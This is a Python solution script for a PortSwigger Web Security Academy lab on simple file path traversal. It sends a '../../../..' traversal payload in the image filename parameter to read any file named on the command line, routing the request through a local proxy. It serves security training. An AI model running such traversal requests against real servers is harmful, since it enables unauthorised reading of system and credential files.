# File path traversal, simple case

# https://portswigger.net/web-security/file-path-traversal/lab-simple

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def read_file(s, url, file):
	file_path = url + '/image?filename=../../../..'
	print('[+] Trying to read %s on the target server...' % file)
	print('\n[+] Sending GET request to "%s"' % (file_path + file))
	r = s.get(file_path + file)
	print('[+] Server response:\n\n%s' % r.text)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: File path traversal, simple case')
	parser = argparse.ArgumentParser(description="[+] Lab: File path traversal, simple case")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	parser.add_argument('-F',dest='file',required=True, help="Target file's path")
	args = parser.parse_args()
	file = args.file
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send Directory Traversal attack ...\n')
			time.sleep(1)
			r = read_file(s, url, file)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
